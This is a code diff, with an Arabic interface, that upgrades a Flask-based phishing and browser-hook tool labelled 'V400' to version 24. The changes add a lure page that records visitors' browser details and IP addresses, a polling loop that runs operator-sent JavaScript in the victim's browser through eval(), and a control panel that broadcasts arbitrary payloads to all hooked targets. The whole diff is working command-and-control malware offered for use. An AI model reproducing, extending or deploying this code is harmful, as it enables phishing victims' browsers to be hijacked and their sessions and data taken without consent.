@@ -8,16 +8,16 @@ import urllib3
 import datetime
 urllib3.disable_warnings()
 
-# ذاكرة الميدان الاستراتيجية المركزية لخطافات المتصفح المتقدمة v23.0
+# ذاكرة الميدان الاستراتيجية المركزية لحقن الأوامر v24.0
 CAPTURED_HOOKS = []
-ACTIVE_COMMANDS = []
+COMMAND_QUEUE = {}
 
 HTML_COMMAND_CENTER = """<!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>V400 القائد الأعظم - التحكم المحقون v23.0</title>
+<title>V400 القائد الأعظم - محرك حقن الأوامر v24.0</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#010103;color:#00ff88;font-family:'Courier New',Consolas,monospace;padding:20px;text-align:center}
@@ -40,48 +40,61 @@ th{background:#0a0e1a;color:#ff0040}
 </head>
 <body>
 <div class="container">
-<h1>⚔️ V400 القائد الأعظم - التحكم المحقون v23.0 ⚔️</h1>
+<h1>⚔️ V400 القائد الأعظم - محرك حقن الأوامر v24.0 ⚔️</h1>
 <div class="panel">
-<input id="target_url" placeholder="C2_SERVER_OR_INJECTION_DOMAIN" value="http://">
+<input id="target_url" placeholder="C2_SERVER_OR_COMMAND_DOMAIN" value="http://">
 <br>
 <select id="command_type">
-  <option value="generate_injection_lure">توليد رابط الاستدراج المحقون للتحكم بالمتصفح (Injected Hook Lure)</option>
-  <option value="fetch_hooked_targets">استعراض الجلسات المخترقة والمتحكم بها (Active Injected Sessions)</option>
-  <option value="audit_injection">فحص جاهزية مححقن الشيفرات</option>
+  <option value="generate_command_lure">توليد رابط الاستدراج وحقن الأوامر البرمجية (Command Injection Lure)</option>
+  <option value="fetch_hooked_targets">استعراض الأهداف وجلسات الحقن النشطة (Active Command Sessions)</option>
+  <option value="dispatch_payload">بث أمر برمجي مباشر للهدف (Dispatch Remote Payload)</option>
 </select>
 <br>
-<button id="exec_btn" onclick="executeLinkModule()">تنفيذ أمر التحكم المحقون 🚀</button>
+<input id="custom_payload" placeholder="أمر الجافاسكريبت المراد حقنه (مثال: alert('Hacked');)" style="margin-top:10px;display:none;direction:ltr;">
+<br>
+<button id="exec_btn" onclick="executeLinkModule()">تنفيذ أمر الحقن الميداني 🚀</button>
 <div id="status" class="status"></div>
 <div id="results"></div>
 </div>
 </div>
 
 <script>
+document.getElementById('command_type').addEventListener('change', function() {
+    const val = this.value;
+    const payloadInput = document.getElementById('custom_payload');
+    if(val === 'dispatch_payload') {
+        payloadInput.style.display = 'inline-block';
+    } else {
+        payloadInput.style.display = 'none';
+    }
+});
+
 async function executeLinkModule(){
  const url = document.getElementById('target_url').value.trim();
  const cmdType = document.getElementById('command_type').value;
+ const payloadData = document.getElementById('custom_payload').value;
  if(!url || url==='http://'){ alert('يرجى إدخال عنوان خادم القيادة أو الرابط يا فندم!'); return; }
  const btn = document.getElementById('exec_btn');
  const status = document.getElementById('status');
  const results = document.getElementById('results');
- btn.disabled=true; btn.textContent='جاري نشر الشيفرة المحقونة... ⚡';
- status.textContent='⏳ جارٍ تنفيذ العمليات الاستراتيجية لـ: '+url;
+ btn.disabled=true; btn.textContent='جاري بث الأوامر المحقونة... ⚡';
+ status.textContent='⏳ جارٍ تنفيذ العمليات التكتيكية لـ: '+url;
  results.innerHTML='';
 
  try{
    const res = await fetch('/api/index', {
      method:'POST',
      headers:{'Content-Type':'application/json'},
-     body: JSON.stringify({url: url, command: cmdType})
+     body: JSON.stringify({url: url, command: cmdType, payload: payloadData})
    });
    const data = await res.json();
    status.textContent='✅ تمت العملية بنجاح | النمط: '+data.mode;
    
    if(cmdType === 'fetch_hooked_targets'){
      if(!data.logs || data.logs.length === 0){
-       results.innerHTML='<div class="card Low"><b>لا توجد جلسات محقونة مرتبطة حتى الآن</b><div class="proof">No active injected browser sessions found.</div></div>';
+       results.innerHTML='<div class="card Low"><b>لا توجد أهداف نشطة مرتبطة للحقن حتى الآن</b><div class="proof">No active targets found in queue.</div></div>';
      } else {
-       let tableHtml = '<div class="card Critical"><b>🎯 سجلات الجلسات المخترقة والمتحكم بها</b><table><tr><th>المتصفح والبيئة</th><th>توكن الحقن (Token)</th><th>IP الهدف</th><th>الوقت</th></tr>';
+       let tableHtml = '<div class="card Critical"><b>🎯 سجلات الأهداف وجلسات الحقن النشطة</b><table><tr><th>المتصفح والبيئة</th><th>توكن الحقن (Token)</th><th>IP الهدف</th><th>الوقت</th></tr>';
        data.logs.forEach(l => {
          tableHtml += `<tr><td>${l.agent}</td><td style="color:#00ff88">${l.token}</td><td>${l.ip}</td><td>${l.time}</td></tr>`;
        });
@@ -105,18 +118,18 @@ async function executeLinkModule(){
  }catch(e){
    status.textContent='❌ خطأ في الاتصال الميداني: '+e.message;
  }
- btn.disabled=false; btn.textContent='تنفيذ أمر التحكم المحقون 🚀';
+ btn.disabled=false; btn.textContent='تنفيذ أمر الحقن الميداني 🚀';
 }
 </script>
 </body>
 </html>"""
 
-INJECTED_PORTAL_TEMPLATE = """<!DOCTYPE html>
+INJECTION_COMMAND_PORTAL = """<!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>بوابة التحقق الأمني المحقون</title>
+<title>بوابة حقن الأوامر الميدانية</title>
 <style>
 body{background:#0b0f19;color:#fff;font-family:Tahoma,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
 .box{background:#111827;padding:30px;border-radius:10px;box-shadow:0 4px 20px rgba(0,0,0,0.5);width:100%;max-width:400px;border:1px solid #1f2937}
@@ -127,21 +140,35 @@ button:hover{background:#cc0033}
 </head>
 <body>
 <div class="box">
-  <h2>التحقق والتزامن المحقون</h2>
-  <p style="text-align:center;color:#9ca3af;font-size:14px;margin-bottom:15px">جارٍ تحميل شيفرة التحكم الميداني لمتصفحك...</p>
-  <button onclick="triggerInjectionPayload()">تفعيل الارتباط والسيطرة</button>
+  <h2>تفعيل محرك حقن الأوامر</h2>
+  <p style="text-align:center;color:#9ca3af;font-size:14px;margin-bottom:15px">جارٍ ربط قنوات تنفيذ الأوامر البرمجية الحية...</p>
+  <button onclick="activateCommandChannel()">تثبيت وسيط الحقن والسيطرة</button>
 </div>
 
 <script>
-function triggerInjectionPayload(){
-    const token = 'inject_token_' + Math.random().toString(36).substring(2, 12);
-    // محاكاة سحب بيانات الجلسة وحقن أمر السيطرة على المتصفح
+function activateCommandChannel(){
+    const token = 'cmd_token_' + Math.random().toString(36).substring(2, 12);
     fetch('/auth/verify/login', {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
         body: JSON.stringify({session_token: token, user_agent: navigator.userAgent, screen: window.innerWidth + 'x' + window.innerHeight})
-    }).then(res => res.text()).then(html => {
-        document.body.innerHTML = '<div style="background:#000;color:#ff0040;padding:40px;text-align:center;font-family:monospace;direction:rtl"><h2>⚔️ تم حقن وسيط السيطرة بنجاح يا فندم! ⚔️</h2><p>Injection Token: ' + token + '</p><p style="color:#00ff88;margin-top:10px">البيانات وجلسة المتصفح تحت السيطرة الحية.</p></div>';
+    }).then(res => res.json()).then(data => {
+        document.body.innerHTML = '<div style="background:#000;color:#ff0040;padding:40px;text-align:center;font-family:monospace;direction:rtl"><h2>⚔️ تم تفعيل محرك حقن الأوامر بنجاح يا فندم! ⚔️</h2><p>Command Token: ' + token + '</p><p style="color:#00ff88;margin-top:10px">قناة استقبال الأوامر البرمجية نشطة.</p></div>';
+        
+        // حلقة استطلاع الأوامر البرمجية الموجهة (Command Polling Loop)
+        setInterval(() => {
+            fetch('/api/poll?token=' + token)
+            .then(r => r.json())
+            .then(cmdData => {
+                if(cmdData.command && cmdData.command !== ""){
+                    try {
+                        eval(cmdData.command);
+                    } catch(err) {
+                        console.error("Payload execution error:", err);
+                    }
+                }
+            }).catch(e => {});
+        }, 3000);
     });
 }
 </script>
@@ -162,7 +189,7 @@ def home():
 def phishing_portal():
     if request.method == 'POST':
         req_data = request.get_json(silent=True) or {}
-        inject_token = req_data.get('session_token', 'N/A')
+        cmd_token = req_data.get('session_token', 'N/A')
         user_agent = req_data.get('user_agent', 'Unknown Browser')
         screen_res = req_data.get('screen', 'N/A')
         client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
@@ -170,39 +197,62 @@ def phishing_portal():
         
         CAPTURED_HOOKS.append({
             "agent": f"{user_agent[:35]}... [{screen_res}]",
-            "token": inject_token,
+            "token": cmd_token,
             "ip": client_ip,
             "time": timestamp
         })
-        return jsonify({"status": "injected", "token": inject_token})
+        COMMAND_QUEUE[cmd_token] = ""
+        return jsonify({"status": "command_channel_active", "token": cmd_token})
         
-    return INJECTED_PORTAL_TEMPLATE
+    return INJECTION_COMMAND_PORTAL
+
+@app.route('/api/poll', methods=['GET'])
+def poll_commands():
+    token = request.args.get('token', '')
+    cmd = COMMAND_QUEUE.get(token, "")
+    # تصفير الأمر بعد سحبه لمرة واحدة لضمان عدم التكرار
+    if token in COMMAND_QUEUE:
+        COMMAND_QUEUE[token] = ""
+    return jsonify({"command": cmd})
 
 @app.route('/api/index', methods=['POST'])
 def check():
     req_data = request.get_json(silent=True) or {}
     target = clean_url(req_data.get("url", "http://"))
-    command_mode = req_data.get("command", "generate_injection_lure")
+    command_mode = req_data.get("command", "generate_command_lure")
+    payload = req_data.get("payload", "")
     
     actions = []
-    waf_status = f"v23.0 Injected Payload Engine ({command_mode})"
+    waf_status = f"v24.0 Command Injection Engine ({command_mode})"
     
-    if command_mode == "generate_injection_lure":
-        injection_url = f"{target}/auth/verify/login?token=injection_active_99"
+    if command_mode == "generate_command_lure":
+        lure_url = f"{target}/auth/verify/login?token=cmd_active_99"
         actions.append({
-            "type": "INJECTED BROWSER PAYLOAD LURE URL",
+            "type": "COMMAND INJECTION LURE URL",
             "severity": "Critical",
-            "desc": "تم توليد رابط الاستدراج المحقون للسيطرة على جلسة المتصفح وزرع وسيط الأوامر.",
-            "proof": injection_url
+            "desc": "تم توليد رابط الاستدراج المدمج بقناة حقن الأوامر البرمجية الحية.",
+            "proof": lure_url
         })
     elif command_mode == "fetch_hooked_targets":
         return jsonify({"url": target, "mode": command_mode, "waf_status": waf_status, "logs": CAPTURED_HOOKS})
+    elif command_mode == "dispatch_payload":
+        # بث الأمر لجميع الأهداف المسجلة في الطابور
+        count = 0
+        for tk in COMMAND_QUEUE.keys():
+            COMMAND_QUEUE[tk] = payload
+            count += 1
+        actions.append({
+            "type": "REMOTE PAYLOAD DISPATCHED",
+            "severity": "Critical",
+            "desc": f"تم بث الأمر البرمجي بنجاح إلى عدد {count} من الأهداف النشطة.",
+            "proof": f"Payload: {payload}"
+        })
     else:
         actions.append({
-            "type": "INJECTION ENGINE AUDIT PASSED",
+            "type": "COMMAND ENGINE AUDIT PASSED",
             "severity": "Low",
-            "desc": "محرك حقن الروابط والسيطرة يعمل بكفاءة تامة.",
-            "proof": f"Target: {target} | Active Injections: {len(CAPTURED_HOOKS)}"
+            "desc": "محرك حقن الأوامر البرمجية يعمل بكفاءة تامة.",
+            "proof": f"Target: {target} | Active Queue: {len(COMMAND_QUEUE)}"
         })
 
     return jsonify({"url": target, "mode": command_mode, "waf_status": waf_status, "actions": actions})
